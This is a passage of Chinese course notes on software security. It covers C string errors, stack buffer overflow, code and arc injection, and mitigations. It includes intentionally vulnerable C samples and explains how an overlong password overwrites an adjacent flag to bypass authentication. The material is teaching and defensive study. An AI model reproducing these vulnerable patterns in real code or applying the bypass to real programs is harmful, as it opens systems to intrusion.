<p>（3）如果我们输入的密码<strong>超过了7个字符（注意：字符串截断符NULL将占用一个字节）</strong>，则越界字符的ASCII码<strong>会修改掉authenticated的值。</strong>如果这段溢出数据恰好把authenticated改为0，则程序流程将被改变。实验的目的：<strong>用非法的超长密码去修改buffer的邻接变量authenticated从而绕过密码验证程序。</strong></p>
<p>2.如何突破密码验证程序</p>
<p>（1）假如我们输入密码为7个英文字母”q”，按照字符串的关系<strong>”qqqqqqq”&gt;”1234567”,strcmp应该返回1，即authenticated为1。</strong></p>
<p>（2）那么我们经过分析可以发现，如果我们输入的是8个q，那么他的最后以为NULL会淹没authenticated的数据。</p>
<p>（3）Authenticated会变成0x00000000，那么判断分支则会走向正确的方向，就会绕过密码验证程序。</p>
<p>3.并不是所有的8位字符串都能得到想要的结果，这是为什么呢？</p>
<p>（1）由于authenticated的值来源于字<strong>符串比较函数strcmp的返回值</strong>。</p>
<p>（2）按照字符串的序关系，当输入字符串<strong>大于“1234567”时，会返回1</strong>，内存中的值为0x00000001，可以淹没地位突破验证</p>
<p>（3）那么当输入字符串<strong>小于“1234567”时，会返回-1</strong>，而变量在内存中的值按照双字-1的补码存放，为0xFFFFFFFF，低位被淹没后便成了0xFFFFFF00，这是的值是不能冲破验证程序的。<strong>如“01234567”就不可以。</strong></p>
<h2 id="字符串安全"><a href="#字符串安全" class="headerlink" title="字符串安全"></a>字符串安全</h2><h3 id="背景和常见问题"><a href="#背景和常见问题" class="headerlink" title="背景和常见问题"></a>背景和常见问题</h3><p>1.C风格的字符串</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2016.png" alt="image.png"></p>
<p>（1）C风格的字符串<strong>由一个连续的字符序列</strong>组成，并以一个<strong>空字符</strong>作为结束。</p>
<p>（2）一个指向字符串的指针实际上就是<strong>指向该字符串的起始字符</strong>。</p>
<p>（3）字符串<strong>长度</strong>指<strong>空字符之前的字节数</strong></p>
<p>（4）字符串的<strong>值</strong>则是它所包含的<strong>按顺序排列</strong>的字符序列。</p>
<p>（5）存储一个字符串所需要的字节数是<strong>字符串的字符数加1</strong>。</p>
<p>3.UTF-8：UTF-8是一种变长字节编码方式。对于某一个字符的UTF-8编码，如果只有一个字节则其最高二进制位为0；如果是多字节，其第一个字节从最高位开始，连续的二进制位值为1的个数决定了其编码的位数，其余各字节均以10开头。UTF-8最多可用到6个字节。（有一道题）</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/086c8a9d78c8209e82731cafc631a2e.png" alt="086c8a9d78c8209e82731cafc631a2e.png"></p>
<h3 id="常见的字符串操作错误"><a href="#常见的字符串操作错误" class="headerlink" title="常见的字符串操作错误"></a>常见的字符串操作错误</h3><p>最常见的错误有（考了n次了）：<strong>无界字符串复制、空结尾错误、字符串截断、差一错误、数组写入越界、不恰当的数据处理</strong></p>
<h4 id="1-无边界字符串复制"><a href="#1-无边界字符串复制" class="headerlink" title="1.无边界字符串复制"></a>1.无边界字符串复制</h4><p>无界字符串越界写操作的有：<strong>gets()、strcpy()、strcat()、memcpy()、memset()。</strong></p>
<p>（1）定义：发生于从一个<strong>无边界数据源复制数据</strong>到一个<strong>定长的字符数组</strong>时。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">char</span> Password[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter 8 character password:&quot;</span>);</span><br><span class="line">gets(Password);</span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure>

<p>（2）下面<strong>复制和连接字符串时</strong>也容易出现错误，因为<strong>标准strcpy()和strcat()函数</strong>执行的都是<strong>无边界复制操作。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> name[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(name, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(name, <span class="string">&quot; = &quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(name, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 上面三个函数都会越界写</span></span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure>

<p>（3）简单的解决方案：利用<strong>strlen()测试输入字符串的长度</strong>然后<strong>动态分配内存</strong>。</p>
<p>动态分配的代码题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">**<span class="type">char</span> *buff = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])+<span class="number">1</span>);** </span><br><span class="line"><span class="comment">// 确保为argv[1]中的**命令行参数以及末尾空字符**分配足够内存</span></span><br><span class="line"><span class="keyword">if</span> (buff!= <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv[1] = %s.\n&quot;</span>, buff);&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Couldn&#x27;t get the memory - recover */</span>&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>（4）C++无界字符串复制：对于下列的C++程序，<strong>如果用户输入多于11个字符，</strong>也会导致越界写。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">12</span>];</span><br><span class="line">cin &gt;&gt; buf;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;echo: &quot;</span> &lt;&lt; buf &lt;&lt; endl;&#125;</span><br></pre></td></tr></table></figure>

<p>（5）C++简单的解决方案</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">12</span>];</span><br><span class="line">cin.<span class="built_in">width</span>(<span class="number">12</span>);</span><br><span class="line"><span class="comment">/* 如果其域宽（继承自ios_base：：width）被设置为大于0，提取操作可以被限制为只提取指定数量的字符 */</span></span><br><span class="line">cin &gt;&gt; buf; <span class="comment">// 一次提取操作调用结束后**域宽被重置为0**</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;echo: &quot;</span> &lt;&lt; buf &lt;&lt; endl; &#125; </span><br></pre></td></tr></table></figure>

<h4 id="2-差一错误"><a href="#2-差一错误" class="headerlink" title="2.差一错误"></a><strong>2.差一错误</strong></h4><p>考试题：以下程序预期的打印结果有几种情况？3</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> source[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(source, <span class="string">&quot;0123456789&quot;</span>);</span><br><span class="line"><span class="type">char</span> *dest = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(source));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">11</span>; i++) &#123;</span><br><span class="line">dest[i] = source[i];&#125;</span><br><span class="line">dest[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;dest = %s&quot;</span>, dest);&#125;</span><br></pre></td></tr></table></figure>

<p>（1）source字符数组（第2行声明）<strong>为10字节，</strong>但strcpy()（第3行）却<strong>对其复制了11个字节，包括一个结尾空字符串</strong></p>
<p>（2）malloc()（第4行）在<strong>堆上分配长度等于source字符串长度的内存</strong>。然而，strlen()返回的<strong>长度值并没考虑结尾空字符</strong></p>
<p>（3）for循环的索引值i（第5行）是<strong>从1开始</strong>的，但C中<strong>数组索引值是从0开始</strong>的</p>
<p>（4）for循环结束条件是<strong>i&lt;&#x3D;11</strong>，可能比程序员期待的<strong>多迭代一次</strong></p>
<p>（5）第7行的<strong>赋值操作会导致越界写</strong></p>
<h4 id="3-空结尾错误"><a href="#3-空结尾错误" class="headerlink" title="3.空结尾错误"></a><strong>3.空结尾错误</strong></h4><p>（1）当使用C风格字符时，另一个常见的问题是<strong>字符串末尾没有正确的空字符。</strong></p>
<p>练习题：给这段代码问你是什么错误</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> a[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> b[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> c[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">strncpy</span>(a, <span class="string">&quot;0123456789abcdef&quot;</span>, <span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="built_in">strncpy</span>(b, <span class="string">&quot;0123456789abcdef&quot;</span>, <span class="keyword">sizeof</span>(b)); </span><br><span class="line"><span class="comment">// **a[]和b[]都没有正确地结尾**</span></span><br><span class="line"><span class="built_in">strncpy</span>(c, a, <span class="keyword">sizeof</span>(c));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(2)从数组S2中<strong>复制不超过n个字符串(空字符后的字符不会被复制)到目标数组S1中。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> * <span class="keyword">restrict</span> s1, <span class="type">const</span> <span class="type">char</span> * <span class="keyword">restrict</span> s2, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure>

<p>因此，如果第一个数组S2中的前n个字符中不存在空字符，那么其结果字符串<strong>将不会是以空字符结尾的。</strong></p>
<h4 id="4-字符串截断"><a href="#4-字符串截断" class="headerlink" title="4.字符串截断"></a>4.字符串截断</h4><p>（1）<strong>一些限制字节数的函数</strong>通常用来防止缓冲区溢出漏洞：<strong>strncpy()代替strcpy()、fgets()代替gets()、snprintf()代替sprintf()</strong></p>
<p>（2）当<strong>目标字符数组的长度不足以容纳一个字符串的内容时</strong>，就会发生字符串截断</p>
<p>（3）字符串截断<strong>会丢失数据</strong>，有时也会导致软件漏洞</p>
<h4 id="5-数组写入越界"><a href="#5-数组写入越界" class="headerlink" title="5.数组写入越界"></a><strong>5.数组写入越界</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123; <span class="comment">// 参数超过128，数组越界</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">128</span>];</span><br><span class="line"><span class="type">char</span> *arg1 = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">while</span> (arg1[i] != <span class="string">&#x27;\0&#x27;</span> ) &#123;</span><br><span class="line">buff[i] = arg1[i];</span><br><span class="line">i++;&#125;</span><br><span class="line">buff[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;buff = %s\n&quot;</span>, buff);&#125;</span><br></pre></td></tr></table></figure>

<p>由于C风格字符事实上就是字符数组，因此完全有可能在<strong>不调用任何函数的情况下</strong>做了不安全的字符串操作。</p>
<h3 id="字符串问题导致的安全漏洞"><a href="#字符串问题导致的安全漏洞" class="headerlink" title="字符串问题导致的安全漏洞"></a>字符串问题导致的安全漏洞</h3><p><strong>字符串问题导致安全漏洞有：缓冲区溢出</strong>、<strong>程序栈</strong>、<strong>代码注入</strong>、<strong>弧注入</strong>。</p>
<p>1.程序栈</p>
<p>（1）栈通过<strong>存储下列内容</strong>来追踪程序的执行和状态：<strong>调用函数的返回地址、函数参数、局部（临时）变量</strong></p>
<p>（2）在下列情况下栈需要被修改：<strong>在函数调用期间、函数初始化期间、从子例程返回时</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2017.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2018.png" alt="image.png"></p>
<p>（3）堆栈<strong>支持嵌套调用</strong>，帧指<strong>由函数调用引发的压入栈的数据。</strong></p>
<p>（4）当前帧的地址被存储到<strong>帧或者基址寄存器中</strong>(英特尔架构中的EBP)</p>
<p>（5）<strong>帧指针在栈中是一个定点的引用。</strong></p>
<p>2.栈要被修改的情况</p>
<p><strong>（1）子例程调用</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2019.png" alt="image.png"></p>
<p><strong>（2）子例程初始化</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2020.png" alt="image.png"></p>
<p><strong>（3）从子例程返回</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2021.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2022.png" alt="image.png"></p>
<p>（4）程序案例</p>
<p>考试12分大题原题：根据输入的不同，列举并分析下图程序可能的结果？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">IsPasswordOK</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">char</span> Password[<span class="number">12</span>]; <span class="comment">// Memory 存储pwd</span></span><br><span class="line">gets(Password); <span class="comment">// Get input from keyboard</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(Password,<span class="string">&quot;goodpass&quot;</span>)) <span class="keyword">return</span>(<span class="literal">true</span>); </span><br><span class="line"><span class="comment">// Password Good</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span>(<span class="literal">false</span>); <span class="comment">// Password Invalid</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">bool</span> PwStatus; <span class="comment">// Password Status</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter Password:&quot;</span>); <span class="comment">// Print</span></span><br><span class="line">PwStatus=IsPasswordOK(); <span class="comment">// Get &amp; Check Password</span></span><br><span class="line"><span class="keyword">if</span> (PwStatus == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Access denied&quot;</span>); <span class="comment">// Print</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">// Terminate Program&#125;</span></span><br><span class="line"><span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Access granted&quot;</span>);<span class="comment">// Print&#125;</span></span><br></pre></td></tr></table></figure>

<p>答题：</p>
<p><strong>（1）输入”goodpass”（正确密码）。</strong>结果显示”Access granted”。因为strcmp比较字符串相等返回0，!0&#x3D;1，返回true。</p>
<p><strong>（2）输入其他错误密码（长度≤11字符）</strong>：”wrong”、”123456”、”hello123”。显示”Access denied”并退出。因为strcmp返回非0，!非0&#x3D;0，返回false。</p>
<p><strong>（3）输入长度≥12字符的字符串</strong>：”AAAAAAAAAAAA”（12个A）。由于长度：<strong>12字符+\0&#x3D;13字节&gt;数组大小12字节</strong>。Password[12]只能存储11个字符+1个’\0’，<strong>输入≥12字符会导致数组越界，</strong>结果缓冲区溢出。可能导致破坏<strong>栈上相邻内存、可能修改函数返回地址、程序可能崩溃</strong>（段错误）、可能被利用执行任意代码。</p>
<p>①执行IsPasswordOK()函数之前，栈中的信息</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2023.png" alt="image.png"></p>
<p>②IsPasswordOK()执行时栈中的信息</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2024.png" alt="image.png"></p>
<p>③IsPasswordOK()调用后栈中的信息</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2025.png" alt="image.png"></p>
<p>3.栈粉碎：当<strong>缓冲区溢出覆写分配给执行栈内存中的数据时</strong>，就会导致栈粉碎。成功的利用这个漏洞能够<strong>覆写栈返回地址</strong>，从而在目标机器中执行任意代码。</p>
<p>4.代码注入</p>
<p>（1）攻击者创建一个<strong>恶意参数：</strong>一个蓄意构造的<strong>字符串，</strong>其中包含一个<strong>指向某些恶意代码的指针</strong>，该代码也由攻击者提供。</p>
<p>（2）当函数返回时，控制就被转移到了<strong>那段恶意代码</strong>。注入的代码就会以<strong>与该有漏洞的程序相同的权限运行。</strong>攻击者通常都以<strong>以root或其他较高权限运行</strong>的程序为目标。</p>
<p>（3）实例</p>
<p>通过下面的二进制输入，这个密码程序能够被用来执行任意的代码:</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2026.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2027.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2028.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2029.png" alt="image.png"></p>
<p>5.弧注入</p>
<p>（1）定义：弧注入<strong>将控制转移到已经存在于程序内存空间中的代码中。</strong></p>
<p>（2）方式：在程序的控制流团中<strong>插入一段新的弧</strong>（表示控制流转移），而不是进行代码注入。可以<strong>安装一个已有函数的地址</strong>（如system()或exec()），用于执行已存在于本地系统上的程序。更复杂的攻击可能会使用这种技术。</p>
<p>（3）漏洞程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_buff</span><span class="params">(<span class="type">char</span> *user_input)</span>&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(buff, user_input, <span class="built_in">strlen</span>(user_input)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">get_buff(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>利用：用<strong>存在的函数地址覆写</strong>返回地址；<strong>创建栈帧来链接</strong>函数调用；再现原始帧返回的程序，<strong>不进行检测并恢复执行。</strong></p>
<p>（4）相关流程</p>
<p>①缓冲区溢出之前及之后的栈</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2030.png" alt="image.png"></p>
<p>②get_buff()返回</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2031.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2032.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2033.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2034.png" alt="image.png"></p>
<p>③f()返回</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2035.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2036.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2037.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2038.png" alt="image.png"></p>
<p>④g()返回</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2039.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2040.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2041.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2042.png" alt="image.png"></p>
<h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>缓解措施包括：<strong>预防</strong>缓冲区溢出；<strong>侦测</strong>缓冲区溢出<strong>并安全地恢复</strong>，使得<strong>漏洞利用</strong>的企图无法得逞。</p>
<p>防范策略：<strong>静态分配空间、动态分配空间。</strong></p>
<p>1.静态方法</p>
<p><strong>静态分配缓冲区</strong>：假设一个<strong>固定大小的缓冲区。</strong>在缓冲区<strong>满了以后不可能添加再数据</strong>，因为静态的方法<strong>丢弃了超出的数据，</strong>所以实际的程序数据会丢失。因此，生成的字符串<strong>必须被充分验证。</strong></p>
<p>（1）<strong>输入长度验证</strong>：缓冲区溢出通常是<strong>字符串或内存越界拷贝</strong>的结果。缓冲区溢出是<strong>确保输入数据的大小不超过其存储的最小缓冲区</strong>来可以预防。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">myfunc</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *arg)</span> &#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(arg) **&gt;=** <span class="keyword">sizeof</span>(buff)) &#123;</span><br><span class="line"><span class="built_in">abort</span>();&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>（2）<strong>使用strlcpy()和strlcat()<strong>。更</strong>安全</strong>，确保结果<strong>非空结尾</strong>。  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">strlcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strlcat</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>strlcpy()：</strong>从src复制空结尾的字符串到dst（<strong>直到size大小</strong>的字符）。</p>
<p><strong>strlcat()：把非空结尾的字符串src连接到dst末尾</strong>（<strong>不超过size</strong>的字符都能够连接到dst末尾）。</p>
<p>①为了阻止缓冲区溢出，strlcpy()和strlcat()<strong>接受size大小的目标字符串</strong>作为参数。对于静态分配目标缓冲区来说，这个值能够<strong>很容易地通过sizeof()操作来获取</strong>。<strong>动态缓冲区的大小不容易计算。</strong></p>
<p>②两个函数都确保目标字符串<strong>对所有非零长度的缓冲区来说都是非空结尾的</strong>。</p>
<p>③strlcpy()和strlcat()函数<strong>返回它们希望创建的字符串的总长度</strong>。strlcpy()简单返回<strong>源字符串的总长度</strong>。strlcat()返回（连接前）<strong>目标字符串的长度加上源字符串的长度</strong>。</p>
<p>④为了检查<strong>字符串截断</strong>，程序需要验证<strong>返回值是否小于参数大小。</strong>如果返回的字符串被程序员截断了，知道需要存储的字符串的字节数目，<strong>可能重新分配或者重新复制。</strong></p>
<p>⑤如果指定的缓冲区大小<strong>比实际的缓冲区长度长</strong>，不正确的使用这些函数<strong>仍然可能会导致缓冲区溢出。</strong>如果程序员<strong>无法验证这些函数结果</strong>，仍可能发生截断错误。</p>
<p>（3）使用新的<strong>安全规范函数</strong>。strcpy_s()代替strcpy()、strcat_s()代替strcat()、strncpy_s()代替strncpy()、strncat_s()代替strncat()。</p>
<p>①<strong>缓解</strong>缓冲区溢出攻击，默认<strong>保护与计划相关文件。</strong></p>
<p>②不产生<strong>无结尾的字符串</strong>，不意外<strong>截断字符串</strong>，保存<strong>空字符结尾的字符串</strong>数据类型，支持<strong>编译时检查</strong>，使<strong>失败显现</strong>，有一个<strong>统一的函数参数和返回类型</strong>模式。</p>
<p>③strcpy_s()函数：把字符<strong>从源字符串复制到目标字符数组</strong>，直到并包括终止null字符。与strcpy()类似，包含一个<strong>额外的rsize_t参数类型</strong>来确定目标缓冲区的最大长度。只有当源字符串可以<strong>完全复制</strong>到目标缓冲区，且目标缓冲区<strong>没有发生溢出时</strong>，才算成功。</p>
<p>2.动态方法</p>
<p><strong>动态地分配缓冲区：</strong>动态分配的缓冲区需要<strong>动态调整额外的内存</strong>。动态方法更好，而且<strong>不丢弃多余的数据（练习题把这个当成缺点）</strong>。主要缺点是如果输入被限制，则可能<strong>耗尽机器内存</strong>，结果<strong>导致拒绝服务攻击。</strong></p>
<p>（1）SafeStr：使用<strong>一种动态分配的方式</strong>，可以在需要时<strong>自动调整字符串的大小</strong>。SafeStr通过在<strong>需要精加字符串大小的操作中</strong>，<strong>重新分配内存并移动字符串内容</strong>来实现这一点。因此，在使用这个库的时候<strong>不会发生缓冲区溢出。</strong></p>
<p>①类型：SafeStr库基于safestr_t类型。该类型保存了<strong>由该指针所引用的内存部分的说明信息</strong>（例如<strong>实际长度和分配的长度</strong>），保存子指针所指向的内存之前。</p>
